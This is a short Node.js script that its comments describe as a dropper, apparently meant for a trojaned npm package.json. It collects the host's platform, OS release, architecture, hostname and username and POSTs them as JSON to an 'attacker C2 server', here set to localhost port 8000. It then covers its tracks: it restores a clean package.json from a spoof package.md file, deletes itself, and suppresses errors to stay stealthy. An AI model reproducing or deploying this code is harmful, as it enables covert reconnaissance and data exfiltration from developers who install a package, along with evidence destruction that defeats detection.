const http = require('http');
const os = require('os');
const fs = require('fs');

// 1. Gather System Information (Reconnaissance)
const payload = JSON.stringify({
    platform: os.platform(),
    release: os.release(),
    architecture: os.arch(),
    hostname: os.hostname(),
    username: os.userInfo().username
});

// 2. Exfiltrate to Attacker C2 Server
const options = {
    hostname: '127.0.0.1',
    port: 8000,
    path: '/',
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Content-Length': payload.length
    }
};

const req = http.request(options, (res) => {
    // 3. Anti-Forensics: Cover our tracks after successful beacon
    
    // Step A: Replace trapped package.json with clean package.md
    if (fs.existsSync('package.md')) {
        fs.copyFileSync('package.md', 'package.json');
        fs.unlinkSync('package.md'); // Remove the clean spoof file
    }
    
    // Step B: Self Delete the Dropper
    try {
        fs.unlinkSync(__filename);
    } catch (err) {
        // silently fail
    }
});

req.on('error', (error) => {
    // If the attacker C2 is down, do nothing to stay stealthy
});

req.write(payload);
req.end();
